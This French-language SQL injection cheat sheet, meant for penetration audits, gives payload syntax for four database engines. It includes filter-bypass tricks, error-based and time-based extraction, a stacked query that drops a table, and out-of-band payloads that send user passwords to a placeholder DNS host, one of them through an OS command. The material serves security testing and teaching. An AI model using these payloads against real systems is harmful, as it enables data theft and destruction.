---
title: "Aide-mémoire : Injection SQL (SQLi Cheat Sheet)"
description: "Cheat sheet SQLi complet : concaténation, sous-chaînes, commentaires, contournement de filtres, fingerprinting, énumération, erreurs conditionnelles, error-based, requêtes empilées, time-based et OOB, pour Oracle, MS-SQL, PostgreSQL et MySQL."
tags:
  - sqli
  - cheat-sheet
  - web-security
  - red-team
  - database
---

# 💉 Aide-mémoire : Injection SQL (SQLi Cheat Sheet)

!!! note "Utilisation de cette fiche"
    Cette fiche synthétise les syntaxes SQL équivalentes entre les quatre principaux SGBD (Oracle, Microsoft SQL Server, PostgreSQL, MySQL) pour un usage rapide en contexte d'audit offensif. Elle complète la fiche théorique [`sqli.md`](sqli.md) consacrée à la méthodologie de détection et de remédiation.

---

## 1. Concaténation de chaînes (String Concatenation)

| SGBD | Syntaxe |
|---|---|
| **Oracle** | `'foo'\|\|'bar'` |
| **Microsoft** | `'foo'+'bar'` |
| **PostgreSQL** | `'foo'\|\|'bar'` |
| **MySQL** | `'foo' 'bar'` (espace) ou `CONCAT('foo','bar')` |

```sql
-- Oracle
SELECT 'foo'||'bar' FROM dual;

-- Microsoft SQL Server
SELECT 'foo'+'bar';

-- PostgreSQL
SELECT 'foo'||'bar';

-- MySQL
SELECT 'foo' 'bar';
SELECT CONCAT('foo','bar');
```

!!! tip "Particularité MySQL"
    MySQL est le seul des quatre SGBD à ne pas utiliser `||` par défaut (ce comportement dépend du mode SQL `PIPES_AS_CONCAT`). La fonction `CONCAT()` est la syntaxe la plus fiable et portable.

---

## 2. Extraction de sous-chaînes (Substring)

Exemple : extraire `"ba"` depuis `"foobar"` (offset 4, longueur 2, index basé sur 1).

| SGBD | Syntaxe |
|---|---|
| **Oracle** | `SUBSTR('foobar', 4, 2)` |
| **Microsoft** | `SUBSTRING('foobar', 4, 2)` |
| **PostgreSQL** | `SUBSTRING('foobar', 4, 2)` |
| **MySQL** | `SUBSTRING('foobar', 4, 2)` |

```sql
-- Oracle
SELECT SUBSTR('foobar', 4, 2) FROM dual; -- 'ba'

-- Microsoft SQL Server
SELECT SUBSTRING('foobar', 4, 2); -- 'ba'

-- PostgreSQL
SELECT SUBSTRING('foobar', 4, 2); -- 'ba'

-- MySQL
SELECT SUBSTRING('foobar', 4, 2); -- 'ba'
```

!!! tip "Usage typique en Blind SQLi"
    Cette fonction est la brique de base de toute extraction caractère par caractère en Boolean-Based ou Time-Based Blind SQLi : on itère l'offset de `1` à `N` en testant chaque caractère possible.

---

## 3. Commentaires & Troncature de requêtes (Comments)

| SGBD | Syntaxe(s) |
|---|---|
| **Oracle** | `--comment` |
| **Microsoft** | `--comment` ou `/*comment*/` |
| **PostgreSQL** | `--comment` ou `/*comment*/` |
| **MySQL** | `#comment`, `-- comment` (espace requis), `/*comment*/` |

```sql
-- Oracle : commentaire simple ligne
SELECT * FROM users WHERE username = 'admin'--' AND password = 'x';

-- Microsoft SQL Server
SELECT * FROM users WHERE username = 'admin'--' AND password = 'x';
SELECT * FROM users WHERE username = 'admin'/*' AND password = 'x'*/;

-- PostgreSQL
SELECT * FROM users WHERE username = 'admin'--' AND password = 'x';

-- MySQL
SELECT * FROM users WHERE username = 'admin'#' AND password = 'x';
SELECT * FROM users WHERE username = 'admin'-- ' AND password = 'x';
```

!!! warning "Espace obligatoire sous MySQL"
    Sous MySQL, la syntaxe `--` doit **impérativement** être suivie d'un espace (`-- `) pour être interprétée comme un commentaire. `admin'--` sans espace final échouera, alors que `admin'-- ` (avec espace) fonctionnera. L'alternative `#` ne souffre pas de cette contrainte.

---

## 4. Contournement de filtres (Bypassing Filters)

!!! warning "Contexte d'application"
    Ces techniques visent à contourner des filtres ou WAF basés sur la détection de mots-clés (blacklist), et non des mécanismes de paramétrage stricts (requêtes préparées), qui restent la seule contre-mesure fiable.

**Casse alternative :**

```sql
SeLeCT username FrOm users;
```

**Commentaires en ligne en lieu et place des espaces (technique MySQL) :**

```sql
SELECT/**/username/**/FROM/**/users;
```

**Commentaires versionnés (spécifiques MySQL) :**

```sql
/*!SELECT*/ username FROM users;
/*!50000SELECT*/ username FROM users;
```

!!! tip "Commentaires versionnés MySQL"
    La syntaxe `/*!CODE*/` fait exécuter le contenu par MySQL comme du SQL normal (le contenu est ignoré par les autres SGBD, qui le traitent comme un commentaire classique). La variante `/*!50000CODE*/` restreint l'exécution aux versions de MySQL supérieures ou égales à `5.00.00`, ce qui peut suffire à contourner certains filtres ne reconnaissant pas cette syntaxe.

---

## 5. Identification du SGBD & Version (Database Version)

| SGBD | Requête |
|---|---|
| **Oracle** | `SELECT banner FROM v$version` ou `SELECT version FROM v$instance` |
| **Microsoft** | `SELECT @@version` |
| **PostgreSQL** | `SELECT version()` |
| **MySQL** | `SELECT @@version` |

```sql
-- Oracle
SELECT banner FROM v$version;
SELECT version FROM v$instance;

-- Microsoft SQL Server
SELECT @@version;

-- PostgreSQL
SELECT version();

-- MySQL
SELECT @@version;
```

---

## 6. Énumération du contenu de la base (Database Contents)

| SGBD | Tables | Colonnes |
|---|---|---|
| **Oracle** | `SELECT * FROM all_tables` | `SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME'` |
| **Microsoft / PostgreSQL / MySQL** | `SELECT * FROM information_schema.tables` | `SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME'` |

```sql
-- Oracle
SELECT * FROM all_tables;
SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME';

-- Microsoft SQL Server / PostgreSQL / MySQL
SELECT * FROM information_schema.tables;
SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME';
```

!!! note "Casse des identifiants sous Oracle"
    Sous Oracle, les noms de tables et de colonnes sont par convention stockés et retournés en **MAJUSCULES** (`'TABLE-NAME'` doit généralement être fourni en majuscules, sauf si l'objet a été créé avec des guillemets doubles préservant la casse).

---

## 7. Erreurs conditionnelles (Conditional Errors)

Technique consistant à forcer une erreur logique (division par zéro, conversion invalide) **uniquement** lorsque la condition testée est vraie, permettant une extraction Blind Booléenne via le code de statut HTTP.

```sql
-- Oracle
SELECT CASE WHEN (CONDITION) THEN TO_CHAR(1/0) ELSE NULL END FROM dual;

-- Microsoft SQL Server
SELECT CASE WHEN (CONDITION) THEN 1/0 ELSE NULL END;

-- PostgreSQL
SELECT 1 = (SELECT CASE WHEN (CONDITION) THEN 1/(SELECT 0) ELSE NULL END);

-- MySQL
SELECT IF(CONDITION,(SELECT table_name FROM information_schema.tables),'a');
```

!!! tip "Principe commun"
    Remplacer `CONDITION` par le test booléen à évaluer (ex : `(SELECT COUNT(*) FROM users)>0`). Si `CONDITION` est vraie, une erreur SQL est déclenchée et remonte généralement en `HTTP 500` ; sinon, la requête s'exécute normalement en `HTTP 200`.

---

## 8. Exfiltration par messages d'erreur visibles (Error-based SQLi)

Ces techniques provoquent une erreur de conversion ou de syntaxe qui **fait fuiter la donnée recherchée directement dans le message d'erreur** renvoyé par l'application.

```sql
-- Microsoft SQL Server (erreur de comparaison de types)
SELECT 'foo' WHERE 1 = (SELECT 'secret');

-- PostgreSQL (erreur de conversion de type)
SELECT CAST((SELECT password FROM users LIMIT 1) AS int);

-- MySQL (via EXTRACTVALUE, exploitation d'une erreur XPath)
SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')));
```

!!! danger "Impact"
    Cette classe de technique est particulièrement efficace car elle permet une exfiltration **en une seule requête**, sans itération caractère par caractère, à condition que l'application affiche les messages d'erreur SQL bruts au client — ce qui constitue en soi une mauvaise pratique de configuration à corriger.

---

## 9. Requêtes empilées / multiples (Batched/Stacked Queries)

Technique consistant à faire exécuter plusieurs requêtes SQL successives séparées par un point-virgule (`;`) au sein d'une seule injection.

| SGBD | Support des requêtes empilées |
|---|---|
| **Oracle** | ❌ Non supporté nativement |
| **Microsoft SQL Server** | ✅ Supporté nativement |
| **PostgreSQL** | ✅ Supporté nativement |
| **MySQL** | ⚠️ Dépend exclusivement de l'API cliente utilisée (PHP/Python) |

```sql
-- Exemple générique de requête empilée (MS-SQL / PostgreSQL)
SELECT * FROM products WHERE id = 1; DROP TABLE logs;--
```

!!! warning "Cas MySQL"
    MySQL ne supporte les requêtes empilées **que si l'API cliente le permet explicitement** (par exemple certaines configurations de PDO en PHP ou de connecteurs Python autorisant le `multi-statement`). La plupart des connecteurs standards désactivent ce comportement par défaut, rendant le stacked-query souvent impraticable sous MySQL en conditions réelles.

---

## 10. Temporisation & Délais temporels (Time Delays)

### 10.1 Inconditionnels

| SGBD | Syntaxe |
|---|---|
| **Oracle** | `dbms_pipe.receive_message(('a'),10)` |
| **Microsoft** | `WAITFOR DELAY '0:0:10'` |
| **PostgreSQL** | `SELECT pg_sleep(10)` |
| **MySQL** | `SELECT SLEEP(10)` |

```sql
-- Oracle
SELECT dbms_pipe.receive_message(('a'),10) FROM dual;

-- Microsoft SQL Server
WAITFOR DELAY '0:0:10';

-- PostgreSQL
SELECT pg_sleep(10);

-- MySQL
SELECT SLEEP(10);
```

### 10.2 Conditionnels

```sql
-- Oracle
SELECT CASE WHEN (CONDITION) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual;

-- Microsoft SQL Server
IF (CONDITION) WAITFOR DELAY '0:0:10';

-- PostgreSQL
SELECT CASE WHEN (CONDITION) THEN pg_sleep(10) ELSE pg_sleep(0) END;

-- MySQL
SELECT IF(CONDITION,SLEEP(10),'a');
```

!!! tip "Pourquoi toujours inclure une branche ELSE"
    Chaque syntaxe conditionnelle prévoit un cas `ELSE` sans délai (ou avec `pg_sleep(0)`), afin que la requête retourne rapidement lorsque la condition est fausse. Sans cette branche, une condition fausse pourrait produire un comportement ambigu et fausser la mesure du délai.

---

## 11. Requêtes Out-of-Band (OOB) via DNS Lookup & Exfiltration

!!! note "Contexte d'usage"
    Ces techniques sont réservées aux scénarios totalement aveugles où ni le canal de réponse ni le canal temporel ne sont exploitables. Elles nécessitent un serveur d'écoute externe (ex : Burp Collaborator) capable de journaliser les requêtes DNS/HTTP entrantes.

### 11.1 DNS Lookup simple

```sql
-- Oracle : via XXE (xmltype)
SELECT xmltype('<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://SUBDOMAIN/"> %remote; ]>') FROM dual;

-- Oracle : via UTL_INADDR (alternative sans privilège XXE)
SELECT UTL_INADDR.get_host_address('SUBDOMAIN') FROM dual;

-- Microsoft SQL Server
exec master..xp_dirtree '//SUBDOMAIN/a';

-- PostgreSQL
copy (SELECT '') to program 'nslookup SUBDOMAIN';

-- MySQL (environnement Windows uniquement)
SELECT LOAD_FILE('\\\\SUBDOMAIN\\a');
SELECT * FROM users INTO OUTFILE '\\\\SUBDOMAIN\\a';
```

!!! warning "Compatibilité MySQL OOB"
    Les techniques OOB sous MySQL via `LOAD_FILE()` ou `INTO OUTFILE` reposent sur l'interprétation par **Windows** d'un chemin UNC (`\\SUBDOMAIN\a`) comme une requête réseau SMB déclenchant une résolution DNS. Ces techniques sont **inopérantes sur un serveur MySQL hébergé sous Linux**, qui ne traite pas les chemins UNC de cette manière.

### 11.2 DNS Lookup avec exfiltration de données

Le principe est identique au lookup simple, à ceci près que le résultat d'une sous-requête est **concaténé directement dans le sous-domaine interrogé**, permettant sa réception en clair côté serveur d'écoute.

```sql
-- Oracle : exfiltration via UTL_INADDR
SELECT UTL_INADDR.get_host_address(
  (SELECT password FROM users WHERE ROWNUM=1) || '.SUBDOMAIN'
) FROM dual;

-- Microsoft SQL Server : exfiltration via xp_dirtree
declare @p varchar(1024);
select @p=(SELECT password FROM users WHERE username='administrator');
exec('master..xp_dirtree "//'+@p+'.SUBDOMAIN/a"');

-- PostgreSQL : exfiltration via program (nslookup)
copy (SELECT password FROM users LIMIT 1) to program 'nslookup $(cat).SUBDOMAIN';

-- MySQL (Windows) : exfiltration via LOAD_FILE
SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.SUBDOMAIN\\a'));
```

!!! danger "Portée de l'exfiltration OOB"
    Cette classe de technique est la plus critique en matière d'impact : elle permet d'extraire des données sensibles **même sur une application totalement aveugle**, sans dépendre du rendu de la réponse HTTP ni du canal temporel, ce qui la rend indétectable par une simple observation de l'application côté client.

---

!!! note "Voir aussi"
    Pour la méthodologie complète de détection (in-band, blind, OAST), les techniques UNION-based, le second-order SQLi et les contre-mesures détaillées (requêtes préparées, whitelisting), se référer à la fiche [`sqli.md`](sqli.md).
